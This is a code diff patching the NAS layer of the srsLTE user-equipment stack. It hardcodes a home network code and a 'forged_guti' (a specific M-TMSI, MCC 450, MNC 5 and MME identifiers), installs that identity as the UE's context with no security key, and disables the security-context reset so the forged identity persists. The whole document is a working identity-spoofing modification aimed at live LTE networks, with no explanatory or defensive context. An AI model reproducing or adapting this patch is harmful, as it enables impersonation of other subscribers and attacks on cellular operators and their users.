@@ -260,6 +260,11 @@ void nas::init(usim_interface_nas* usim_, rrc_interface_nas* rrc_, gw_interface_
     home_plmn.from_number(61441, 65281); // This is 001 01
   }
 
+  //SJM : config our HOME PLMN
+  home_plmn.from_number(62544, 65288); 
+  nas_log->console("%s\n",home_plmn.to_string().c_str());
+
+
   // parse and sanity check EIA list
   std::vector<uint8_t> cap_list = split_string(cfg_.eia);
   if (cap_list.empty()) {
@@ -302,6 +307,28 @@ void nas::init(usim_interface_nas* usim_, rrc_interface_nas* rrc_, gw_interface_
   reattach_timer.set(reattach_timer_duration_ms, [this](uint32_t tid) { timer_expired(tid); });
 
   handle_airplane_mode_sim();
+
+  //SJM : config our GUTI
+  
+  LIBLTE_MME_EPS_MOBILE_ID_GUTI_STRUCT forged_guti;
+
+  forged_guti.m_tmsi = 0xdc4401ae;
+  forged_guti.mcc = 450;
+  forged_guti.mnc = 5;
+  forged_guti.mme_group_id = 32913;
+  forged_guti.mme_code = 0x71;
+
+  memcpy(&ctxt.guti, &forged_guti, sizeof(LIBLTE_MME_EPS_MOBILE_ID_GUTI_STRUCT));
+  have_guti = true;
+  have_ctxt = true;
+
+  // Update RRC UE-Idenity
+  s_tmsi_t s_tmsi;
+  s_tmsi.mmec   = ctxt.guti.mme_code;
+  s_tmsi.m_tmsi = ctxt.guti.m_tmsi;
+  rrc->set_ue_identity(s_tmsi);
+  current_sec_hdr = LIBLTE_MME_SECURITY_HDR_TYPE_PLAIN_NAS;
+  ctxt.ksi  = LIBLTE_MME_NAS_KEY_SET_IDENTIFIER_NO_KEY_AVAILABLE;
 
   running = true;
 }
@@ -997,11 +1024,14 @@ int nas::apply_security_config(srslte::unique_byte_buffer_t& pdu, uint8_t sec_hd
  */
 void nas::reset_security_context()
 {
+  //SJM : make sure srsLTE don't reset our GUTI
+  /*
   have_guti = false;
   have_ctxt = false;
   current_sec_hdr = LIBLTE_MME_SECURITY_HDR_TYPE_PLAIN_NAS;
   ctxt      = {};
   ctxt.ksi  = LIBLTE_MME_NAS_KEY_SET_IDENTIFIER_NO_KEY_AVAILABLE;
+  */
 }
 
 /*******************************************************************************
